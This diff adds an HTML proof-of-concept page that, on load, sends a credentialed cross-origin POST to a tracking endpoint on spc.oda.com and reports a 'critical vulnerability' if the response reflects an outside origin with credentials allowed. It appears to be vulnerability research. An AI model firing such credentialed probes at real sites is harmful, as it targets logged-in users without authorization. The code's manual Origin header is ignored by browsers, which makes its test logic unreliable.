@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Test for spc.oda.com</title>
+    <script>
+        async function testCORS() {
+            try {
+                const response = await fetch('https://spc.oda.com/com.snowplowanalytics.snowplow/tp2', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Origin': 'https://github.com'  // <-- ЛЮБОЙ внешний домен
+                    },
+                    body: JSON.stringify({
+                        "schema": "iglu:com.snowplowanalytics.snowplow/payload_data/jsonschema/1-0-4",
+                        "data": [{"url": "https://oda.com/no/account/"}]
+                    }),
+                    credentials: 'include'
+                });
+                
+                const headers = {};
+                response.headers.forEach((v, n) => headers[n] = v);
+                
+                document.getElementById('result').innerHTML = `
+                    <h3>✅ CORS Test Result for spc.oda.com:</h3>
+                    <p><strong>Status:</strong> ${response.status}</p>
+                    <p><strong>Access-Control-Allow-Origin:</strong> ${headers['access-control-allow-origin'] || 'not set'}</p>
+                    <p><strong>Access-Control-Allow-Credentials:</strong> ${headers['access-control-allow-credentials'] || 'not set'}</p>
+                    ${headers['access-control-allow-origin'] === 'https://github.com' && headers['access-control-allow-credentials'] === 'true' 
+                        ? '<div style="color:red;font-weight:bold">🚨 CRITICAL VULNERABILITY CONFIRMED ON spc.oda.com!</div>' 
+                        : ''}
+                `;
+            } catch (e) {
+                document.getElementById('result').innerHTML = `<p>❌ Error: ${e.message}</p>`;
+            }
+        }
+    </script>
+</head>
+<body onload="testCORS()">
+    <h1>CORS Test for Snowplow Tracking (spc.oda.com)</h1>
+    <div id="result">Testing...</div>
+    <p>⚠️ <strong>Important:</strong> You must be logged into oda.com in the same browser for this test to work properly.</p>
+</body>
+</html>
